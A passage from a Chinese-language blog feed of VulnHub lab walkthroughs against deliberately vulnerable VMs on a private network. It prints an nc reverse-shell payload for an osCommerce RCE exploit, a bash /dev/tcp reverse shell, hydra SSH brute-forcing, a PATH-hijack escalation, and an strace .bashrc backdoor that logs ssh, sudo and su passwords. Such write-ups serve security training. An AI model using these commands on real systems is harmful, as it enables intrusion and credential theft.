class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMz\">http://192.168.31.133</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-505.png\" width=\"620\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.133</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-506.png\" width=\"520\" alt=\"Image\">\n<p>对扫描的网址进行挨个测试，发现到一个敏感网址:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2c=\">http://192.168.31.133/catalog</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-507.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"oscommerce-漏洞寻找\"><a class=\"markdownIt-Anchor\" href=\"#oscommerce-漏洞寻找\">#</a> oscommerce 漏洞寻找</h3>\n<p>靶机上存在 oscommerce，直接搜索是否存在相应的 exp</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-508.png\" width=\"520\" alt=\"Image\">\n<p>默认进入的漏洞利用并不能直接权限提升，用更精确的搜寻来寻找在 exploit-db 上搜查 osCommerce 2.3.4 存在的漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-509.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 搜索到了一个 RCE 漏洞，此影响较大，可直接拿到 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-510.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"exploit-db-使用\"><a class=\"markdownIt-Anchor\" href=\"#exploit-db-使用\">#</a> exploit-db 使用</h3>\n<p>获取漏洞利用代码 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDQzNzQ=\">https://www.exploit-db.com/exploits/44374</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-511.png\" width=\"620\" alt=\"Image\">\n<p>查看该漏洞是如何利用的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-512.png\" width=\"620\" alt=\"Image\">\n<p>需要两个地址，一个是基础的路径，一个是目标路径<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHA=\"> http://192.168.31.133/catalog/install/index.php</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQ=\">http://192.168.31.133/catalog/install/install.php?step=4</span></p>\n<p>同时也可以从 searchsploit 获取到漏洞利用的代码<br>\n searchsploit osCommerce 2.3.4.1<br>\nsearchsploit -x php/webapps/44374.py</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-513.png\" width=\"700\" alt=\"Image\">\n<p>查看 exp 利用方式的两个 url 地址是否能正常访问<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHA=\"> http://192.168.31.133/catalog/install/index.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-514.png\" width=\"520\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQ=\">http://192.168.31.133/catalog/install/install.php?step=4</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-515.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"oscommerce-漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#oscommerce-漏洞利用\">#</a> oscommerce 漏洞利用</h3>\n<p>从 searchsploit 中获取到的 exp 复制出来，进行修正</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-516.png\" width=\"420\" alt=\"Image\">\n<p>需要修改的有三个地方，两个 url 地址，以及要执行的命令<br>\n base_url=“<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHAlRTIlODAlOUQ=\">http://192.168.31.133/catalog/install/index.php”</span><br>\ntarget_url=“<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQlRTIlODAlOUQ=\">http://192.168.31.133/catalog/install/install.php?step=4”</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-517.png\" width=\"580\" alt=\"Image\">\n<p>执行反弹 shell 的命令，调用系统去在 /tmp 里边写一个文件，用来反弹<br>\n payload += ‘system (“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.135 4444 &gt;/tmp/f”);’</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-518.png\" width=\"580\" alt=\"Image\">\n<p>运行此 exp，得到一个 url 地址，是用来触发命令的链接</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-519.png\" width=\"560\" alt=\"Image\">\n<p>监听 kali 机器上的 4444 端口，同时访问该 url 地址使得命令被执行，得到反弹的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-520.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">紧接着用python3 拿到一个标准的终端</span></span><br><span class=\"line\">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-521.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"pspy64-监控\"><a class=\"markdownIt-Anchor\" href=\"#pspy64-监控\">#</a> pspy64 监控</h3>\n<p>翻阅目录时并没有找到敏感文件，直接上传一个 pspy<br>\n 监控靶机上有没有定期执行一些需要高权限才能执行的命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget 192.168.31.135/pspy64s</span><br><span class=\"line\">chmod +x pspy64s</span><br><span class=\"line\">./pspy64s</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-522.png\" width=\"520\" alt=\"Image\">\n<p>看到有个计划任务被执行，查看后发现其中有一串 base64 加密数据，</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-523.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 解密后发现是 root 的密码，su root 提权成功</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/114%20ICA/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/114%20ICA/",
            "title": "VULNHUB 14 ICA",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWNhLTEsNzQ4Lw==\">https://www.vulnhub.com/entry/ica-1,748/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgzMDY0NS9hcnRpY2xlL2RldGFpbHMvMTIzNTIwMTE4\">https://blog.csdn.net/weixin_44830645/article/details/123520118</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 ICA：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-290.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.50</p>\n<ol start=\"2\">\n<li>确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.50 -oN /tmp/ica.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-291.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21, 80, 8080</p>\n<h3 id=\"qdpm92-漏洞寻找\"><a class=\"markdownIt-Anchor\" href=\"#qdpm92-漏洞寻找\">#</a> qdpm9.2 漏洞寻找</h3>\n<p>1 ）打开网址 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTA=\">http://192.168.31.50</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-292.png\" width=\"520\" alt=\"Image\">\n<p>发现版本号 qdpm9.2 直接搜索 exp</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-293.png\" width=\"520\" alt=\"Image\">\n<p>在 exploit-db 上找到了可以利用的 poc</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-294.png\" width=\"520\" alt=\"Image\">\n<p>访问网址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNTAvY29yZS9jb25maWcvZGF0YWJhc2VzLnltbA==\">http://192.168.31.50/core/config/databases.yml</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-295.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 得到数据库用户名：qdpmadmin 密码：UcVQCMQk2STVeS6J</p>\n<h3 id=\"mysql-寻找敏感信息\"><a class=\"markdownIt-Anchor\" href=\"#mysql-寻找敏感信息\">#</a> mysql 寻找敏感信息</h3>\n<p><code>mysql -h 192.168.31.50 -u qdpmadmin - p</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-296.png\" width=\"520\" alt=\"Image\">\n<p>可以用 Navicat 进入数据库</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-297.png\" width=\"580\" alt=\"Image\">\n<p>也可以登陆到服务器之后对这些表进行查看</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-298.png\" width=\"400\" alt=\"Image\">\n<p>-&gt; 找到一些 base64 加密后的密码以及一些用户名</p>\n<h3 id=\"hydra-爆破密码\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破密码\">#</a> hydra 爆破密码</h3>\n<p>将用户名和解密后的密码加载到本地</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-299.png\" width=\"420\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用hydra破解:</span></span><br><span class=\"line\">hydra -L user.txt -P pass.txt ssh://192.168.31.50</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-300.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"服务器信息收集\"><a class=\"markdownIt-Anchor\" href=\"#服务器信息收集\">#</a> 服务器信息收集</h3>\n<img data-src=\"/N1h1l157/VULNHUB/image-301.png\" width=\"550\" alt=\"Image\">\n<p>寻找是否有可利用的 s 权限的文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-302.png\" width=\"450\" alt=\"Image\">\n<h3 id=\"篡改环境变量提权\"><a class=\"markdownIt-Anchor\" href=\"#篡改环境变量提权\">#</a> 篡改环境变量提权</h3>\n<p>strings 命令用于查看二进制文件中可打印的字符</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-303.png\" width=\"400\" alt=\"Image\">\n<p>发现 /opt/get_access 会执行 cat 命令<br>\n因此可以伪造 cat 命令，修改环境变量，使 get_access 执行一个伪造的 cat</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export PATH=/tmp:$PATH</span><br><span class=\"line\">echo ‘/bin/bash’ &gt; /tmp/cat</span><br><span class=\"line\">Chmod +x /tmp/cat</span><br><span class=\"line\">/opt/get_access</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-304.png\" width=\"360\" alt=\"Image\">\n<h3 id=\"strace-后门\"><a class=\"markdownIt-Anchor\" href=\"#strace-后门\">#</a> strace 后门</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看是否存在其他的strace监控键盘记录，有的话通过<span class=\"built_in\">kill</span> - 9 <span class=\"built_in\">id</span>删掉</span></span><br><span class=\"line\">alias | grep ssh &amp;&amp; ps -ef | grep strace</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改环境变量</span></span><br><span class=\"line\">cat &gt;&gt; ~/.bashrc &lt;&lt; EOF</span><br><span class=\"line\">alias ssh=&#x27;strace -f -e trace=read,write -o /tmp/.ssh-`date +%d%h%m%s`.log -s 32 ssh&#x27;</span><br><span class=\"line\">alias sudo=&#x27;strace -f -e trace=read,write -o /tmp/.sudo-`date &#x27;+%d%h%m%s&#x27;`.log -s 32</span><br><span class=\"line\">sudo&#x27;</span><br><span class=\"line\">alias su=&#x27;strace -f -e trace=read,write -o /tmp/.su-`date &#x27;+%d%h%m%s&#x27;`.log -s 32 su&#x27;</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">运行环境变量</span></span><br><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-305.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听/tmp文件下新增的.ssh文件</span></span><br><span class=\"line\">watch -n1 ls -Alh /tmp</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">找出此阶段内登陆到此服务器的密码的记录,无论正确与否都会被监听</span></span><br><span class=\"line\">cat /tmp/.ssh-09May051652090355.log</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-306.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; strace 后门监控键盘有失败的时候，原因未知</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/121%20RIPPER/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/121%20RIPPER/",
            "title": "VULNHUB 21 RIPPER",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmlwcGVyLTEsNzA2Lw==\">https://www.vulnhub.com/entry/ripper-1,706/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ3ODE2L2FydGljbGUvZGV0YWlscy8xMjMzMzI1ODI=\">https://blog.csdn.net/qq_42947816/article/details/123332582</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 RIPPER：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1）arp 确定靶机地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-480.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.84</p>\n<p>2）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p- 192.168.31.115</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-481.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80,10000</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODQ=\">http://192.168.31.84</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-482.png\" width=\"520\" alt=\"Image\">\n<p><code>dirsearch -u http://192.168.31.84</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-483.png\" width=\"340\" alt=\"Image\">\n<p>没有什么新发现，先不管 80 端口的 web<br>\n 查看网站:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODQ6MTAwMDA=\">http://192.168.31.84:10000</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-484.png\" width=\"520\" alt=\"Image\">\n<p>提示会跳转到 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw\">https://ripper-min:10000</span><br>\n 修改本地 hosts 文件，将 url 地址改为目标靶机 ip 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-485.png\" width=\"290\" alt=\"Image\">\n<p>进入到页面 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw\">https://ripper-min:10000</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-486.png\" width=\"590\" alt=\"Image\">\n<p>一个 webmin 的登陆页面，收集此网站的相关信息</p>\n<h3 id=\"robots-页面查看\"><a class=\"markdownIt-Anchor\" href=\"#robots-页面查看\">#</a> robots 页面查看</h3>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JvYm90cy50eHQ=\">https://ripper-min:10000/robots.txt</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-487.png\" width=\"480\" alt=\"Image\">\n<p>找到一个提示，采用的 base64 加密，解密后得到一个关键词 “rips”</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-488.png\" width=\"520\" alt=\"Image\">\n<p>直接将 rips 拿到谷歌上搜索，它是一个做代码分析的工具</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-489.png\" width=\"520\" alt=\"Image\">\n<p>进入到 rips 官网得知，其安装下载之后的目录在 /rips/ 里边</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-490.png\" width=\"520\" alt=\"Image\">\n<p>在原来的 url 地址上拼接上 rips 看是否能有新发现:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JpcHM=\">https://ripper-min:10000/rips</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-491.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 此页面并没有任何反应，别忘了我们还有一个 80 端口</p>\n<h3 id=\"rip-扫描-web\"><a class=\"markdownIt-Anchor\" href=\"#rip-扫描-web\">#</a> rip 扫描 web</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8xOTIuMTY4LjMxLjg0L3JpcHMv\">https://192.168.31.84/rips/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-492.png\" width=\"620\" alt=\"Image\">\n<p>进入到了 rips 代码审计的界面，看样子需要填一个 path，根据要求填写为 /var/www 后点击扫描</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-493.png\" width=\"650\" alt=\"Image\">\n<p>扫描到了一些漏洞，并且看到了一个敏感文件 secret.php，点击 secret.php 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-494.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 得到了泄漏出来的账户和密码 ripper:Gamespeop</p>\n<h3 id=\"可访问文件筛选\"><a class=\"markdownIt-Anchor\" href=\"#可访问文件筛选\">#</a> 可访问文件筛选</h3>\n<p>爆出来的密码可能是 ssh 连接的密码，也可能是网站后台密码，通过 ssh 连接判断是否能登陆到对方的服务器上<br>\n <code>ssh 192.168.31.84 -l ripper</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-495.png\" width=\"460\" alt=\"Image\">\n<p>-&gt; 成功拿到 ripper 的权限，尝试去拿 root 账户的权限</p>\n<p>查询目录结构，看到出了 ripper 之外的另外一个用户 cubes<br>\n 查看出了基础的几个基本目录后，是否有其他文件是这两个用户能操作的<br>\n <code>find / -user ripper 2&gt;/dev/null | grep -v “proc\\|home\\|run\\|sys”</code> <br>\n <code>find / -user cubes 2&gt;/dev/null | grep -v “home”</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-496.png\" width=\"610\" alt=\"Image\">\n<p>发现 cubes 可以操作的文件有一个 secret.file 文件，查看后得到密码<br>\n su cubes 输入密码后成功拿到了 cubes 的权限</p>\n<p>借助 find 来寻找属于用户 cubes 可以操作的文件<br>\n <code>find / -user cubes 2&gt;/dev/null | grep -v “home\\|proc”</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-497.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"备份文件泄露\"><a class=\"markdownIt-Anchor\" href=\"#备份文件泄露\">#</a> 备份文件泄露</h3>\n<p><code>cat /var/webmin/backup/miniser.log</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-498.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 找到了敏感信息 webmin 的账户和密码：admin:tokiohotel</p>\n<p>进入 webmin 的网站后台登陆地址，输入账户密码进入后台 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw\">https://ripper-min:10000</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-499.png\" width=\"520\" alt=\"Image\">\n<p>在后台中发现有个 terminal 的标志，直接点击此按钮</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-500.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"后台反弹-shell\"><a class=\"markdownIt-Anchor\" href=\"#后台反弹-shell\">#</a> 后台反弹 shell</h3>\n<p>点击后在 web 页面就会弹出来一个终端窗口，而且是 root 权限的</p>\n<p>但是在 web 界面操作并不是很方遍，接下来把此 shell 进行反弹<br>\n <code>bash - c ‘bash -I &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1’</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-501.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">接受反弹的shell，并且美化终端</span></span><br><span class=\"line\">nc -lvvp 4444</span><br><span class=\"line\">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-502.png\" width=\"500\" alt=\"Image\">\n<p>-&gt; 最后拿到了一个 root 账户的标准 shell</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/127%20TYPO/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/127%20TYPO/",
            "title": "VULNHUB 27 TYPO",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdHlwby0xLDQ3Mi8=\">https://www.vulnhub.com/entry/typo-1,472/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS90eXBvLTEtdnVsbmh1Yi13YWxrdGhyb3VnaC8=\">https://www.infosecarticles.com/typo-1-vulnhub-walkthrough/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 TYPO：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-sacn -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-662.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.153</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p 192.168.0.153</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-663.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80,8000,8080,8081</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>依次打开 80,8000,8080,8081 的网站进行访问，收集相关信息</p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTM=\">http://192.168.0.153</span> 进行信息收集，发现网站是一个 typo3 的地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-664.png\" width=\"570\" alt=\"Image\">\n<p>打开 http://192.168.0.153:8000 搜集信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-665.png\" width=\"500\" alt=\"Image\">\n<p>打开 http://192.168.0.153:8080 搜集信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-666.png\" width=\"520\" alt=\"Image\">\n<p>打开 http://192.168.0.153:8081 搜集信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-667.png\" width=\"380\" alt=\"Image\">\n<p>收集目录: <code>dirsearch -u 192.168.0.153:8000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-668.png\" width=\"320\" alt=\"Image\">\n<p>依次打开收集到的目录看能否找到更多信息</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODAvcGhwaW5mby5waHA=\">http://192.168.31.176:8080/phpinfo.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-669.png\" width=\"520\" alt=\"Image\">\n<p>收集目录: <code>dirsearch -u 192.168.0.153:8081</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-670.png\" width=\"550\" alt=\"Image\">\n<h3 id=\"phpmyadmin-渗透测试\"><a class=\"markdownIt-Anchor\" href=\"#phpmyadmin-渗透测试\">#</a> phpmyadmin 渗透测试</h3>\n<p>发现敏感地址，phpmyadmin 存在弱口令</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODEvcGhwbXlhZG1pbi8=\">http://192.168.31.176:8081/phpmyadmin/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-671.png\" width=\"520\" alt=\"Image\">\n<p>用弱口令 root：root 登陆成功拿到后台的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-672.png\" width=\"630\" alt=\"Image\">\n<p>对 phpmyadmin 进行写 shell 拿网站权限</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示目录</span></span><br><span class=\"line\">show variables like &#x27;%datadir%&#x27;;</span><br><span class=\"line\">select @@basedir;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-673.png\" width=\"320\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">是否可以写入</span></span><br><span class=\"line\">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">结果为/var/lib/mysql-files，只允许导出到此目录</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-674.png\" width=\"380\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看是否开启日志记录以及日志保存目录</span></span><br><span class=\"line\">SHOW VARIABLES LIKE &#x27;%general_log%&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">结果为OFF</span></span><br></pre></td></tr></table></figure>\n<img 